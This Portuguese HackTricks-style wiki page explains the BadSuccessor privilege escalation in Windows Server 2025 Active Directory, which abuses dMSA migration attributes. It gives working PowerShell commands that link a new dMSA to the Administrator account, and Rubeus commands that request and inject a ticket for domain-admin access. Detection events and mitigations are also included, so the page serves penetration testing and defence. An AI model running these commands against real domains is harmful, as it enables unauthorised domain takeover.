# BadSuccessor: Escalada de privilégios por abuso da migração de dMSA delegada

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

As Contas de Serviço Gerenciadas Delegadas (**dMSA**) são a próxima geração de sucessoras das **gMSA**, disponibilizadas no Windows Server 2025. Um fluxo de migração legítimo permite que administradores substituam uma conta *antiga* (de usuário, computador ou serviço) por uma dMSA, preservando as permissões de forma transparente. O fluxo é disponibilizado por cmdlets do PowerShell, como `Start-ADServiceAccountMigration` e `Complete-ADServiceAccountMigration`, e depende de dois atributos LDAP do **objeto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *link DN* para a conta substituída (antiga).
* **`msDS-DelegatedMSAState`**       – estado da migração (`0` = nenhum, `1` = em andamento, `2` = *concluída*).<sup>[[1]](#references)</sup>

Se um atacante puder criar **qualquer** dMSA dentro de uma OU e manipular diretamente esses 2 atributos, o LSASS e o KDC tratarão a dMSA como sucessora da conta vinculada. Quando o atacante se autenticar como a dMSA, **herdará todos os privilégios da conta vinculada** – até **Domain Admin**, se a conta Administrator estiver vinculada.<sup>[[1]](#references)</sup>

Essa técnica foi denominada **BadSuccessor** pela Unit 42 em 2025. Mais tarde, a Microsoft atribuiu a ela o **CVE-2025-53779** e lançou uma atualização de segurança em **agosto de 2025**. A técnica continua relevante em ambientes Windows Server 2025 sem patches e em avaliações de delegações perigosas em OUs.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Em DCs corrigidos, uma [migração de dMSA bilateral](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) ainda pode expor uma conta-alvo quando o atacante também puder gravar seus atributos de migração. Isso é mais restrito do que o ataque original, que permitia atingir qualquer alvo.

### Pré-requisitos do ataque

1. Uma conta que tenha permissão para criar objetos dentro de **uma Unidade Organizacional (OU)** *e* tenha pelo menos uma destas permissões:
   * `Create Child` → classe de objeto **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (criação genérica)
2. Conectividade de rede com LDAP e Kerberos (cenário padrão de máquina associada ao domínio / ataque remoto).<sup>[[1]](#references)</sup>

## Enumeração de OUs vulneráveis

A Unit 42 disponibilizou um script auxiliar de PowerShell que analisa os descritores de segurança de cada OU e destaca as ACEs necessárias:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Nos bastidores, o script executa uma busca LDAP paginada por `(objectClass=organizationalUnit)` e verifica cada `nTSecurityDescriptor` em busca de

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (classe de objeto *msDS-DelegatedManagedServiceAccount*)

## Etapas de exploração

Assim que uma OU com permissão de gravação é identificada, o ataque fica a apenas 3 gravações LDAP de distância:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Após a replicação, o atacante pode simplesmente fazer **logon** como `attacker_dMSA$` ou solicitar um Kerberos TGT – o Windows criará o token da conta *substituída*.<sup>[[1]](#references)</sup>

### Automação

Vários PoCs públicos automatizam todo o fluxo de trabalho, incluindo a recuperação de senha e o gerenciamento de tickets:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Módulo do NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Detecção e caça

Habilite a **Auditoria de objetos** nas OUs e monitore os seguintes eventos de segurança do Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Criação do objeto **dMSA**
* **5136** – Modificação de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Alterações específicas de atributos
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emissão de TGT para o dMSA

Correlacionar `4662` (modificação de atributo), `4741` (criação de uma conta de computador/serviço) e `4624` (logon subsequente) ajuda a identificar rapidamente atividades do BadSuccessor. Soluções XDR como **XSIAM** vêm com consultas prontas para uso (consulte as referências).<sup>[[2]](#references)</sup>

## Mitigação

* Aplique a atualização de segurança da Microsoft para **CVE-2025-53779** e verifique o nível do patch em cada controlador de domínio Windows Server 2025.<sup>[[6]](#references)</sup>
* Aplique o princípio do **menor privilégio** – delegue o gerenciamento de *contas de serviço* somente a funções confiáveis.
* Remova `Create Child` / `msDS-DelegatedManagedServiceAccount` das OUs que não exijam isso explicitamente.
* Monitore os IDs de evento listados acima e gere alertas quando identidades *que não sejam Tier 0* criarem ou editarem dMSAs.

## Veja também


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Abusando do dMSA para escalar privilégios no Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Quando contas boas ficam ruins: explorando contas de serviço gerenciadas delegadas](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [PoC do SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Módulo BadSuccessor do NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
